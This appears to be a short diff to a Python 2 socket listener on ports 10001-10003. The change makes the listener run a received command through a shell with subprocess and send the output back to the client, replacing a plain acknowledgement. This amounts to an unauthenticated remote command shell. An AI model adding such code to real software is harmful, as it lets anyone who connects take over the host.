@@ -25,7 +25,13 @@ for port in [10001,10002,10003]:
 
             print msg
             
-            client.send("Request received at " + str(port))
+            proc=subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,)
+            output=proc.communicate()[0]
+            print output
+            
+            client.send(output)
+            
+            #client.send("Request received at " + str(port))
             client.close()
         
     else:
